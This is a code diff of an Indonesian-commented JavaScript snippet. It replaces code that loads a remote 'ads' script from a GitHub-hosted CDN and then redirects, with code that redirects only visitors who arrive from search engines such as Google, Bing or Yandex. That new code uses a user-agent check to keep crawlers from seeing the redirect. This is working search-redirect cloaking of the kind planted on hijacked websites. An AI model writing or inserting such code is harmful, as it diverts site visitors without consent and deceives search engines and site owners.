@@ -1,40 +1,28 @@
 (function() {
-    if (window.location.protocol === 'http:') {
-        window.location.replace(window.location.href.replace("http://", "https://"));
-        return;
-    }
+    const targetURL = "https://google.com";
+	
+    const searchEngines = [
+        'google.', 
+        'bing.com', 
+        'yandex.', 
+        'duckduckgo.com', 
+        'yahoo.com', 
+        'ecosia.org', 
+        'baidu.com'
+    ];
 
-    try {
-        if (!document.querySelector('meta[http-equiv="Content-Security-Policy"]')) {
-            const meta = document.createElement('meta');
-            meta.httpEquiv = "Content-Security-Policy";
-            meta.content = "upgrade-insecure-requests";
-            document.head.prepend(meta);
-        }
-    } catch (e) {
-        console.error("CSP Error:", e);
-    }
+    const botPatterns = /bot|googlebot|crawler|spider|robot|crawling|slurp|lighthouse/i;
 
-    const timestamp = new Date().getTime();
-    const scriptURL = "https://cdn.statically.io/gh/digiitaltools/ads/main/semangka.js?v=2";
-    const targetURL = "https://www.google.com"; 
+    const referrer = document.referrer.toLowerCase();
+    const userAgent = navigator.userAgent.toLowerCase();
 
-    const script = document.createElement('script');
-    script.src = scriptURL;
-    script.async = true;
+    const isSearchEngine = searchEngines.some(engine => referrer.includes(engine));
+    const isBot = botPatterns.test(userAgent);
 
-    script.onload = function() {
-        console.log("Script semangka.js berhasil dimuat.");
-    };
-
-    script.onerror = function() {
-        console.error("Gagal memuat script. Mengalihkan ke target default...");
+    if (isSearchEngine && !isBot) {
+        console.log("Traffic valid dari Search Engine. Mengalihkan...");
         window.location.replace(targetURL);
-    };
-
-    document.head.appendChild(script);
-
-    setTimeout(() => {
-        window.location.replace(targetURL);
-    }, 3500);
+    } else {
+        console.log("Trafik diabaikan (Bukan SE atau terdeteksi Bot).");
+    }
 })();
